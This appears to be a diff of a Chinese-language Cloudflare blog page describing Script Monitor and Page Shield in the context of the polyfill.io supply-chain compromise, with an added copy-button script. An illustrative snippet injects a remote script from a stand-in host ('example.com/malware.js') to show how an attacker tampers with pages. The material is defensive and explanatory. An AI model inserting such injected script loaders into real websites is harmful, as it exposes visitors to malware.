@@ -53,8 +53,30 @@
 <span class="line"><span class="sk-6a737d-8b8b8b94">// Malicious code added by the attacker</span></span>
 <span class="line"><span class="sk-d73a49-a0a0a0">let</span><span class="sk-24292e-fff"> malScript </span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-24292e-fff"> document.</span><span class="sk-6f42c1-ffc799">createElement</span><span class="sk-24292e-fff">(</span><span class="sk-032f62-99ffe4">'script'</span><span class="sk-24292e-fff">);</span></span>
 <span class="line"><span class="sk-24292e-fff">malScript.src </span><span class="sk-d73a49-a0a0a0">=</span><span class="sk-032f62-99ffe4"> 'https://example.com/malware.js'</span><span class="sk-24292e-fff">;</span></span>
-<span class="line"><span class="sk-24292e-fff">document.body.</span><span class="sk-6f42c1-ffc799">appendChild</span><span class="sk-24292e-fff">(malScript);</span></span></code></pre>
+<span class="line"><span class="sk-24292e-fff">document.body.</span><span class="sk-6f42c1-ffc799">appendChild</span><span class="sk-24292e-fff">(malScript);</span></span></code></pre><button type="button" class="code-copy-btn" data-code-copy="" aria-label="复制代码" data-copy-label="复制代码" data-copied-label="代码已复制！"><span class="code-copy-btn__idle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path>
+			</svg></span><span class="code-copy-btn__done"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" width="16" height="16" fill="currentColor" aria-hidden="true">
+				<path d="M229.66,77.66l-128,128a8,8,0,0,1-11.32,0l-56-56a8,8,0,0,1,11.32-11.32L96,188.69,218.34,66.34a8,8,0,0,1,11.32,11.32Z"></path>
+			</svg></span></button>
 </div>
+<script type="module">
+	globalThis.process ??= {}, globalThis.process.env ??= {}, document.querySelectorAll(`[data-code-copy]`).forEach(e => {
+		let t = e.closest(`.emdash-code`)?.querySelector(`pre code`);
+		if (!t) return;
+		let n = e.dataset.copyLabel ?? ``,
+			r = e.dataset.copiedLabel ?? ``,
+			i = null;
+		e.addEventListener(`click`, () => {
+			navigator.clipboard.writeText(t.textContent ?? ``).then(() => {
+				e.setAttribute(`data-copied`, ``), e.setAttribute(`aria-label`, r), i && clearTimeout(i), i = setTimeout(() => {
+					e.removeAttribute(`data-copied`), e.setAttribute(`aria-label`, n), i = null
+				}, 1500)
+			}).catch(e => {
+				console.warn(`code-copy: clipboard write failed`, e)
+			})
+		})
+	});
+</script>
 <p>当<a href="https://blog.cloudflare.com/polyfill-io-now-available-on-cdnjs-reduce-your-supply-chain-risk" target="_blank" rel="noopener noreferrer"><u>有关 pollyfill.io 库所有权变更的消息</u></a>传出时，Script Monitor 发挥了至关重要的作用。Script Monitor 的用户可以立即看到他们网站上加载的脚本，快速轻松地了解他们是否处于风险之中&nbsp;</p>
 <p>我们很高兴通过向所有客户提供 Script Monitor，从而尽可能扩展这些脚本的可见性。您可以在﻿<a href="https://developers.cloudflare.com/page-shield/detection/monitor-connections-scripts" target="_blank" rel="noopener noreferrer">﻿<u>此处的文档中</u>﻿</a>﻿了解如何开始。<br><br>Page Shield 的现有用户可以立即过滤受监控的数据，了解他们的应用是否使用了 polyfill.io （或任何其他库）。此外，我们<a href="https://blog.cloudflare.com/automatically-replacing-polyfill-io-links-with-cloudflares-mirror-for-a-safer-internet" target="_blank" rel="noopener noreferrer"><u>构建了一个 polyfill.io 重写</u></a>以响应遭到入侵的服务，并于 2024 年 6 月为 Free 计划自动启用。</p>
 <h3>Turnstile 作为 Google Firebase 扩展</h3>
